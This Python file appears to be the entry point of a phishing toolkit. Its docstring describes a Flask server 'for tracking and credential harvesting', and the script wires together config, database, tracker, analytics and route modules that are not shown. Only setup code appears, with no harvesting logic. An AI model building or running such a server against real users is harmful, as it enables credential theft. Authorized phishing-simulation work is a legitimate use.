#!/usr/bin/env python3
"""
Flask server for tracking and credential harvesting
"""

from flask import Flask
from core.config_manager import ConfigManager
from core.database import Database
from tracking.tracker import Tracker
from tracking.analytics import Analytics
from web.routes import Routes

def create_app():
    """Create and configure Flask application"""
    app = Flask(__name__)
    
    # Load configuration
    config = ConfigManager()
    
    # Initialize database
    database = Database(config.get('database_path'))
    
    # Initialize tracker and analytics
    tracker = Tracker(database)
    analytics = Analytics(database)
    
    # Register routes
    Routes(app, tracker, analytics)
    
    return app

def start_server(port: int = 8080):
    """Start the tracking server"""
    app = create_app()
    
    print(f"[*] Starting tracking server on port {port}")
    print(f"[*] Access stats at: http://localhost:{port}/stats")
    print(f"[*] Press Ctrl+C to stop")
    
    app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Phishing Tracking Server")
    parser.add_argument('--port', type=int, default=8080, help='Server port')
    
    args = parser.parse_args()
    start_server(args.port)